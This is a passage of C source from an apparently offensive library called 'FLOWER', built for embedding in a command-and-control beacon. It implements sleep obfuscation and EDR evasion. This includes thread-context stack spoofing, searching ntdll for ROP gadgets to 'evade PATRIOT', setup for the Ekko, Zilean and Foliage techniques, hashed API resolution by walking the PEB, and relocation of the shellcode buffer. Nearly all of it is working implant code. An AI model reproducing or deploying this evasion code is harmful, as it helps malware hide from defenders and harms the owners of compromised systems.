            PRINTF( "[FLOWER] [-] FLOWER_STACKSPOOF: NtDuplicateObject failed\n" );
            return STATUS_UNSUCCESSFUL;
        }

        Prm->Spoof.OgCtx.ContextFlags   = CONTEXT_FULL;
        Prm->Spoof.SpfCtx.ContextFlags  = CONTEXT_FULL;

        //
        // to look like we are not sleeping
        //
        Prm->Spoof.SpfCtx.Rip   = U_PTR( Ctx->Win32.RtlUserThreadStart + 0x21 );
        Prm->Spoof.SpfCtx.Rsp   = U_PTR( Prm->Spoof.EmptyStk );
    }

    //
    // if FLOWER_GADGET_* is specified we find the relevant gadget in a module to use while sleeping
    // allows to evade PATRIOT
    //
    if ( Ctx->Config & FLOWER_GADGET_RAX ) {
        if ( ( Prm->Gadget = FwGetGadget( Pattern, sizeof( Pattern ) ) ) ) {
            PRINTF( "[FLOWER] [*] FLOWER_GADGET_RAX: using gadget @ %p\n", Prm->Gadget )
        } else {
            Ctx->Config &= ~( FLOWER_GADGET_RAX );
            PRINTF( "[FLOWER] [-] Could not find gadget, aborting gadget use\n" )
        }

    } else if ( Ctx->Config & FLOWER_GADGET_RBX ) {
        //
        // change pattern so it's now FF 23
        //
        Pattern[ 1 ] = 0xE3;
        if ( ( Prm->Gadget = FwGetGadget( Pattern, sizeof( Pattern ) ) ) ) {
            PRINTF( "[FLOWER] [*] FLOWER_GADGET_RBX: using gadget @ %p\n", Prm->Gadget )
        } else {
            Ctx->Config &= ~( FLOWER_GADGET_RBX );
            PRINTF( "[FLOWER] [-] Could not find gadget, aborting gadget use\n" )
        }
    }
    return STATUS_SUCCESS;
}

/*!
 * @brief
 *  prepare a param struct for FwRopStart
 *
 * @param Ctx
 *  ptr to internal ctx struct
 *
 * @param Prm
 *  ptr to param struct to initialize
 *
 * @param Event
 *  object to signal
 *
 * @param Wait
 *  object to wait on
 *
 * @param OldBase
 *  old (current, at the time of calling)
 *  shellcode base
 *
 * @param NxtBase
 *  next base
 *
 * @return NTSTATUS
 */
FUNC NTSTATUS FwpRopstartPrm(
        _In_  PFLOWER_CTX Ctx,
        _Out_ PFLOWER_ROPSTART_PRM Prm,
        _In_  HANDLE Event,
        _In_  HANDLE Wait,
        _In_  PVOID OldBase,
        _In_  PVOID NxtBase
) {
    if ( !Ctx || !Prm || !Event || !Wait || !OldBase || !NxtBase ) {
        return STATUS_UNSUCCESSFUL;
    }

    //
    // NtSignalAndWaitForSingleObject args
    //
    Prm->Func        = Ctx->Win32.NtSignalAndWaitForSingleObject;
    Prm->Signal      = Event;
    Prm->Wait        = Wait;
    Prm->Alertable   = FALSE;
    Prm->TimeOut     = NULL;

    //
    // rebasing info
    //
    Prm->ImgBase     = OldBase;
    Prm->NewBase     = NxtBase;

    return STATUS_SUCCESS;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                              CTX                                                            ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 * @brief
 *  initializes the internal ctx struct of flower
 *  including functions, modules, gadgets, ...
 *
 * @param Ctx
 *  pointer to the ctx struct to initialize
 *
 * @param Flags
 *  configuration flags so we don't load unused functions
 *
 * @return
 *  !0 if failed
 */
FUNC NTSTATUS FlowerCtx(
        _Out_ PFLOWER_CTX Ctx,
        _In_  ULONG Flags
) {
    NTSTATUS    Status     = { 0 };

    if ( ! Ctx ) {
        return STATUS_INVALID_PARAMETER;
    }

    //
    // TODO: sanity check function for flags ?
    // edit: i cbf ngl, fuck around find out lil bro
    //

    //
    // set shc memory information
    //
    Ctx->ShcBase    = SHC_START();
    Ctx->ShcLength  = U_PTR( SHC_END() ) - U_PTR( Ctx->ShcBase );
    Ctx->NxtBuf     = C_PTR( 0xB0BABEAD );

    //
    // could not be bothered to use a hashtable, do use one and dont be lazy like me :P
    //

    //
    // first load NTDLL from the PEB
    // then ntdll related functions
    //
    if ( ( Ctx->Mods.Ntdll = FwModuleHandle( H_MODULE_NTDLL ) ) ) {
        //
        // common
        //
        Ctx->Win32.NtSignalAndWaitForSingleObject   = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
        Ctx->Win32.NtAllocateVirtualMemory          = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
        Ctx->Win32.NtWaitForSingleObject            = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTWAITFORSINGLEOBJECT );
        Ctx->Win32.NtFreeVirtualMemory              = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTFREEVIRTUALMEMORY );
        Ctx->Win32.RtlCaptureContext                = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
        Ctx->Win32.RtlExitUserThread                = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLEXITUSERTHREAD );
        Ctx->Win32.RtlMoveMemory                    = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLMOVEMEMORY );
        Ctx->Win32.RtlZeroMemory                    = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLZEROMEMORY );
        Ctx->Win32.NtCreateEvent                    = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTCREATEEVENT );
        Ctx->Win32.NtSetEvent                       = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTSETEVENT );
        Ctx->Win32.NtContinue                       = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTCONTINUE );
        Ctx->Win32.NtClose                          = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTCLOSE );

        if ( Flags & FLOWER_STACKSPOOF ) {
            Ctx->Win32.NtDuplicateObject    = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTDUPLICATEOBJECT );
            Ctx->Win32.NtSetContextThread   = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTSETCONTEXTTHREAD );
            Ctx->Win32.NtGetContextThread   = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTGETCONTEXTTHREAD );
            Ctx->Win32.RtlUserThreadStart   = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLUSERTHREADSTART );
        }

        //
        // technique specific
        //
        if ( Flags & FLOWER_EKKO_OBF ) {
            Ctx->Win32.RtlCreateTimer       = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLCREATETIMER );
            Ctx->Win32.RtlCreateTimerQueue  = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLCREATETIMERQUEUE );
            Ctx->Win32.RtlDeleteTimerQueue  = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
        }

        if ( Flags & FLOWER_ZILEAN_OBF ) {
            Ctx->Win32.RtlRegisterWait = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLREGISTERWAIT );
        }

        if ( Flags & FLOWER_FOLIAGE_OBF ) {
            Ctx->Win32.NtQueueApcThread     = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTQUEUEAPCTHREAD );
            Ctx->Win32.NtAlertResumeThread  = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTALERTRESUMETHREAD );
            Ctx->Win32.NtTerminateThread    = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTTERMINATETHREAD );
            Ctx->Win32.NtCreateThreadEx     = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTCREATETHREADEX );
            Ctx->Win32.NtTestAlert          = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTTESTALERT );
            Ctx->Win32.RtlExitUserThread    = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLEXITUSERTHREAD );
            Ctx->Win32.RtlUserThreadStart   = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_RTLUSERTHREADSTART );
            Ctx->Win32.NtGetContextThread   = FwLdrFunction( Ctx->Mods.Ntdll, H_FUNC_NTGETCONTEXTTHREAD );
        }

    } else return STATUS_UNSUCCESSFUL;

    //
    // load KERNEL32 and related functions
    //
    if ( ( Ctx->Mods.Kernel32 = FwModuleHandle( H_MODULE_KERNEL32 ) ) ) {
        //
        // common
        //
        Ctx->Win32.WaitForSingleObjectEx    = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_WAITFORSINGLEOBJECTEX );
        Ctx->Win32.VirtualProtect           = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_VIRTUALPROTECT );
        Ctx->Win32.VirtualAlloc             = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_VIRTUALALLOC );
        Ctx->Win32.VirtualFree              = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_VIRTUALFREE );
        Ctx->Win32.LocalAlloc               = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_LOCALALLOC );
        Ctx->Win32.LocalFree                = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_LOCALFREE );
        Ctx->Win32.LoadLibraryW             = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_LOADLIBRARYW );

        //
        // only FOLIAGE uses those nerd fiber functions
        // [they are forwarded btw (I THINK?), so careful with that]
        //
        if ( Flags & FLOWER_FOLIAGE_OBF ) {
            Ctx->Win32.ConvertThreadToFiberEx   = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_CONVERTTHREADTOFIBEREX );
            Ctx->Win32.ConvertFiberToThread     = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_CONVERTFIBERTOTHREAD );
            Ctx->Win32.CreateFiberEx            = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_CREATEFIBEREX );
            Ctx->Win32.SwitchToFiber            = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_SWITCHTOFIBER );
            Ctx->Win32.DeleteFiber              = FwLdrFunction( Ctx->Mods.Kernel32, H_FUNC_DELETEFIBER );
        }
    } else return STATUS_UNSUCCESSFUL;

    //
    // we use loadlibrary to load additional modules
    // you should honestly change that :)
    //
#if FW_DEBUG == 1
    if ( ( Ctx->Mods.Msvcrt = Ctx->Win32.LoadLibraryW( L"MSVCRT" ) ) ) {
        Ctx->Win32.printf   = FwLdrFunction( Ctx->Mods.Msvcrt, H_FUNC_PRINTF );
    }
#endif

    if ( ( Ctx->Mods.Advapi32 = Ctx->Win32.LoadLibraryW( L"ADVAPI32" ) ) ) {
        Ctx->Win32.SystemFunction032    = FwLdrFunction( Ctx->Mods.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
    }


    //
    // put our config flags in Ctx->Config since cbf to add
    // a flags argument to every other function
    //
    Ctx->Config = Flags;

    PRINTF( "[FLOWER] [+] Init successful\n" );

    return STATUS_SUCCESS;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///                                                             UTILS                                                           ///
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//
// consider making these functions return the already existing
// functions in your beacon if adding the lib to it (to avoid dupes)
//

#pragma region [ministd]

FUNC SIZE_T FwStrLenA(
        _In_ PCSTR String
) {
    PCSTR String2;

    for ( String2 = String; *String2; ++String2 );

    return ( String2 - String );
}

FUNC INT MemCompare( PVOID s1, PVOID s2, INT len)
{
    PUCHAR p = s1;
    PUCHAR q = s2;
    INT charCompareStatus = 0;

    if ( s1 == s2 ) {
        return charCompareStatus;
    }

    while (len > 0)
    {
        if (*p != *q)
        {
            charCompareStatus = (*p >*q)?1:-1;
            break;
        }
        len--;
        p++;
        q++;
    }
    return charCompareStatus;
}

#pragma endregion

#pragma region [hash]

/*!
 * @brief
 *  hash a given buffer using the fnv1a algorithm
 *
 * @param Buffer
 *  pointer to the buffer to hash
 *
 * @param Length
 *  size of buffer to hash
 *  if 0 then hash data until \0
 *
 */
FUNC ULONG FwHash(
        _In_      PVOID Buffer,
        _In_opt_  ULONG Length
) {
    UCHAR   Current = 0;
    ULONG   Fnv     = 0;
    ULONG   Offset  = 0;
    PCHAR   Ptr     = 0;

    Fnv     = 0x811C9DC5;
    Offset  = 0x01000193;

    //
    // avoid hashing a NULL buffer
    //
    if ( ! Buffer ) {
        return 0;
    }

    Ptr = A_PTR( Buffer );

    while ( TRUE ) {
        //
        // get the current character
        //
        Current = *Ptr;

        if ( !Length ) {
            if ( !*Ptr ) break;
        }
        else {
            if ( (ULONG)( Ptr - A_PTR( Buffer ) ) >= Length ) break;

            if ( !*Ptr ) {
                ++Ptr;
                continue;
            }
        }

        if ( Current >= 'a' && Current <= 'z' ) {
            Current -= 0x20;
        }

        Fnv ^= Current;
        Fnv *= Offset;

        *Ptr++;
    }

    return Fnv;
}

#pragma endregion

#pragma region [peb]

/*!
 * @brief
 *  get module handle from the PEB
 *
 * @param Hash
 *  hash value of the module name
 *
 * @return
 *  pointer to the module base
 */
FUNC PVOID FwModuleHandle(
        _In_ ULONG Hash
) {
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Next  = { 0 };

    Head  = &( NtCurrentPeb()->Ldr->InLoadOrderModuleList );
    Next  = Head->Flink;

    while ( Next != Head ) {
        Data = C_PTR( Next );

        if ( FwHash( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }

        Next = Next->Flink;
    }

    return NULL;
}

#pragma endregion

#pragma region [pe]

/*!
 * @brief
 *  retrieve image header
 *
 * @param Image
 *  image base address
 *
 * @return
 *  pointer to the nt headers of the image
 */
FUNC PIMAGE_NT_HEADERS FwImgHeader(
        _In_ PVOID Image
) {
    PIMAGE_DOS_HEADER DosHeader = { 0 };
    PIMAGE_NT_HEADERS NtHeader  = { 0 };

    DosHeader = C_PTR( Image );

    if ( DosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        return NULL;
    }

    NtHeader = C_PTR( U_PTR( Image ) + DosHeader->e_lfanew );

    if ( NtHeader->Signature != IMAGE_NT_SIGNATURE ) {
        return NULL;
    }

    return NtHeader;
}

/*!
 * @brief
 *  parses the EAT of a module and hash
 *  each exported function, if a match is found
 *  return a pointer to the function
 *
 * @param Module
 *  pointer to the module
 *
 * @param Hash
 *  hash of the wanted function
 *
 * @return
 *  pointer to the function, if found
 */
FUNC PVOID FwLdrFunction(
        _In_ PVOID Module,
        _In_ ULONG Hash
) {
    PIMAGE_EXPORT_DIRECTORY    ExpDir      = { 0 };
    PIMAGE_NT_HEADERS          NtHeader    = { 0 };
    ANSI_STRING                AnsiString  = { 0 };
    SIZE_T                     ExpDirSize  = { 0 };
    PDWORD                     AddrNames   = { 0 };
    PDWORD                     AddrFuncs   = { 0 };
    PWORD                      AddrOrdns   = { 0 };
    PCHAR                      FuncName    = { 0 };
    PVOID                      FuncAddr    = { 0 };

    //
    // sanity check
    //
    if ( ! Module || ! Hash ) {
        return NULL;
    }

    //
    // retrieve nt headers
    //
    if ( ! ( NtHeader = FwImgHeader( Module ) ) ) {
        return NULL;
    }

    //
    // parse the EAT from the NT headers
    //
    ExpDirSize     = NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    ExpDir         = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    AddrNames      = C_PTR( Module + ExpDir->AddressOfNames );
    AddrFuncs      = C_PTR( Module + ExpDir->AddressOfFunctions );
    AddrOrdns      = C_PTR( Module + ExpDir->AddressOfNameOrdinals );

    //
    // iterate over the EAT
    //
    for ( DWORD i = 0; i < ExpDir->NumberOfNames; i++ ) {
        //
        // retrieve current function name
        //
        FuncName = A_PTR( Module + AddrNames[ i ] );

        //
        // hash function name to compare with given hash
        //
        if ( FwHash( FuncName, 0 ) == Hash ) {
            FuncAddr = C_PTR( Module  + AddrFuncs[ AddrOrdns[ i ] ] );

            //
            // is this a forwarded function
            //
            if ( U_PTR( FuncAddr ) >= U_PTR( ExpDir ) &&
                 U_PTR( FuncAddr ) < ( U_PTR( ExpDir ) + ExpDirSize ) )
            {
                //
                // use LdrGetProcedureAddress to lazily resolve the forwarded func
                // assignment broken down cuz i dont have my big screens rn
                //
                __typeof__( LdrGetProcedureAddress ) *pLdrGetProcedureAddress =
                        FwLdrFunction(
                                FwModuleHandle( H_MODULE_NTDLL ),
                                H_FUNC_LDRGETPROCEDUREADDRESS
                        );

                AnsiString.Length           = FwStrLenA( FuncName );
                AnsiString.MaximumLength    = AnsiString.Length + sizeof( CHAR );
                AnsiString.Buffer           = FuncName;

                if ( !NT_SUCCESS( pLdrGetProcedureAddress( Module, &AnsiString, 0, &FuncAddr ) ) ) {
                    return NULL;
                }
            }

            return FuncAddr;

        }
    }
}

#pragma endregion

#pragma region [crt]

#pragma endregion

/*!
 * @brief prepare the region to flow into
 */
FUNC PVOID FwpMemPrepare(
        _In_ PFLOWER_CTX Ctx,
        _In_ ULONG Size
) {
    PVOID Memory    = { 0 };
    ULONG Offset    = FW_BASE_OFS;

    //
    // try allocating a new region till we are successful
    // if an allocation fails, increment the base offset from
    // the shellcode base by ShiftOfs
    //
    PRINTF( "[FLOWER] [*] Trying to allocate NxtBuf @ %p\n", C_PTR( U_PTR( SHC_START() ) + Offset ) );
    while ( TRUE ) {
        if ( ! ( Memory = Ctx->Win32.VirtualAlloc(
                C_PTR( U_PTR( SHC_START() ) + Offset ),
                Size,
                ( MEM_COMMIT | MEM_RESERVE ),
                PAGE_READWRITE
        ) ) ) {
            Offset += FW_SHIFT_OFS;
            continue;
        }
        PRINTF( "[FLOWER] [*] NxtBuf allocated @ %p\n", Memory );
        break;
    }

    return Memory;
}

#pragma region [gadget]

/*!
 * @brief find a gadget in NTDLL
 */
FUNC PVOID FwGetGadget(
    _In_ PBYTE Pattern,
    _In_ SIZE_T PatternSize
) {
    PIMAGE_NT_HEADERS     NtHdr     = { 0 };
    PIMAGE_SECTION_HEADER SecHdr    = { 0 };
    PVOID                 SecBase   = { 0 };
    PVOID                 SecEnd    = { 0 };


    NtHdr   = FwImgHeader( FwModuleHandle( H_MODULE_NTDLL ) );
    //
    // enumerate sections
    //
    for ( SHORT i = 0; i < NtHdr->FileHeader.NumberOfSections; ++i ) {
        SecHdr  = B_PTR( IMAGE_FIRST_SECTION( NtHdr ) + ( IMAGE_SIZEOF_SECTION_HEADER * i ) );

        //
        // try to find .text
        //
        if ( ( C_DEF32( SecHdr->Name ) | 0x20202020 ) == 'xet.' )
        {
            //
            // setup section info so we make sure we stay in it
            //
            SecBase     = C_PTR( FwModuleHandle( H_MODULE_NTDLL ) + SecHdr->VirtualAddress );
            SecEnd      = C_PTR( SecBase + SecHdr->Misc.VirtualSize );

            //
            // now we try to get the gadget
            //
            for ( PBYTE Addr = SecBase; Addr < SecEnd; ++Addr ) {
                if ( MemCompare( C_PTR( Addr ), Pattern, PatternSize ) == 0 ) {
                    return C_PTR( Addr );
                }
            }
        }
    }

    return NULL;
}

#pragma endregion

#pragma region [sleep]
/*!
 * @brief
 *  get current timestamp since unix epoch
 *  from KUSER_SHARED_DATA->SystemTime
 */
FUNC ULONG64 SharedTimestamp(
        VOID
) {
    LARGE_INTEGER Time  = { 0 };

    Time.LowPart  = USER_SHARED_DATA->SystemTime.LowPart;
    Time.HighPart = USER_SHARED_DATA->SystemTime.High2Time;

    return Time.QuadPart;
}

/*!
 * @brief
 *  sleep using KUSER_SHARED_DATA->SystemTime
 *
 * based on my first blogpost, that i plan on
 * rewriting at a later date.
 *
 * @param Delay
 *  sleep time in ms
 */
FUNC VOID FwSharedSleep(
        _In_ ULONG64 Delay
) {
    SIZE_T  Acc           = { 0 };
    ULONG64 End           = { 0 };
    ULONG   TicksPerMilli = 10000;

    Delay *= TicksPerMilli;

    End  = SharedTimestamp() + Delay;

    //
    // increment accumulator until we are done
    //
    while ( SharedTimestamp() < End ) {
        Acc += 1;
    }

    //
    // FF check
    //
    if ( ( SharedTimestamp() - End ) > 2000 ) {
        return;
    }
}
#pragma endregion

#pragma region [event]
/*!
 * @brief
 *  wrapper around NtSetEvent
 *
 * @param Event
 *  event to set
 *
 * @return
 *  NTSTATUS
 */
FUNC VOID FwEventSet(
        _In_ HANDLE Event
) {
    //
    // we resolve NtSetEvent as we cannot pass the ctx struct to it since we are
    // limited to 1 arg
    //
    __typeof__( NtSetEvent )* pNtSetEvent = FwLdrFunction( FwModuleHandle( H_MODULE_NTDLL ), H_FUNC_NTSETEVENT );

    //
    // wrap call
    //
    if ( ! NT_SUCCESS( pNtSetEvent( Event, NULL ) ) ) {
        __debugbreak();
    }
}
#pragma endregion

